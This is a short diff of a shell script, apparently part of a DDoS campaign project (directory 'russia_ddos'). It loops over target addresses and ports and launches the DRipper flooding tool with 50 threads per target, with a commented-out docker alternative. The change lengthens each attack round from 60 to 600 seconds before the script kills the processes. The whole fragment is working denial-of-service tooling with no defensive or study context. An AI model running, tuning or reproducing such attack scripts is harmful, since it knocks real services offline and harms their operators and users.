@@ -21,7 +21,7 @@ do
         python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
 #        docker run -t --rm alexmon1989/dripper:latest -l 2048 -s $addr -m $prot -p $port -t 50&
 done
-sleep 60
+sleep 600
 #pkill -9 docker
 pkill -9 python3
 done
